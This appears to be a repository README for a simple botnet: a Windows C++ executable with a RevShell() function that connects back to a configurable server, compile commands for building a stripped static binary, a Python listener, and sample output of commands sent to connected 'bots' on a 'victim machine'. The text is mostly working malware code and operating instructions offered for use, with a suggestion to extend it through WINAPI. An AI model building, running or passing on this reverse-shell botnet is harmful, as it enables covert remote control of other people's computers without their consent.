# Simple Botnet Server and Executable on C++ and Python

  ## Usage:
 
 ### Specify address and port of botnet server in main.cpp: 
 ```sh
void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2, 2), &wsaver);
    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("[address_of_botnet_server]");
    addr.sin_port = htons([port]);
...
}
``` 
  
  ### On Linux Compile Using:
  ```sh
 $ i686-w64-mingw32-g++ -std=c++11 main.cpp -o [name_of_executable].exe -s -lws2_32 -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
### On Windows Compile Using:
  ```sh
 $ g++ -std=c++11 main.cpp -o [name_of_executable].exe -s -lws2_32 -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### Start Botnet Server:

  ```sh
$ python3 Botnet_server.py <LHOST> <LPORT> //To Start listener
```

### Run executable on a victim machine and then you can run commands:
#### Currently only "pwd , whoami, hostname, exec, and exit" commands are supported.
#### You can extend functionality by adding other snippets from WINAPI 

  ```sh
$ [+] Starting Botnet listener on tcp://127.0.0.1:8080

BotCmd> [*] Slave 127.0.0.1:51232 connected with Thread-ID:  Thread-2
[*] Slave 127.0.0.1:51234 connected with Thread-ID:  Thread-3

BotCmd> whoami
[+] Sending Command: whoami to 2 bots
Doe

BotCmd> pwd
[+] Sending Command: pwd to 2 bots
Z:\home\Doe\Desktop\

BotCmd> 

```
## Credits:

### Thanks to [paranoidninja](https://github.com/paranoidninja/) for an amazing [blogpost](http://niiconsulting.com/checkmate/2018/02/malware-development-welcome-dark-side-part-1/)! 


